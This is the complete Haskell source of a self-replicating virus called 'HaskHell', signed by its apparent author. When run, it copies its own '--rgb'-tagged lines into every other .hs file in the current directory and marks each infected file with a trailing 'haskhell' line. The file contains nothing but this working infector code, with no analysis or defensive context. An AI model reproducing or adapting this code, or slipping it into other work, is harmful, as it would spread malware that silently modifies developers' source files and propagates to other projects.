import System.Environment--rgb
import System.IO--rgb
import System.Directory--rgb
import Data.List--rgb
--HaskHell - roy g biv 13/3/13
virus a b=do--rgb
 c<-readFile b--rgb
 let(d,e)=(partition(isPrefixOf"import")(lines c))--rgb
 if(==)(last(e))"haskhell"then return()--rgb
 else writeFile(b)(unlines(d++a++e++["haskhell"]))--rgb

haskhell=do--rgb
 a<-getProgName--rgb
 if(isSuffixOf".hs"a)then do--rgb
  b<-readFile a--rgb
  let c=filter(isSuffixOf"--rgb")(lines b)--rgb
  d<-getDirectoryContents"."--rgb
  mapM_(virus c)(filter(isSuffixOf".hs")d)--rgb
 else return()--rgb

main = do
haskhell
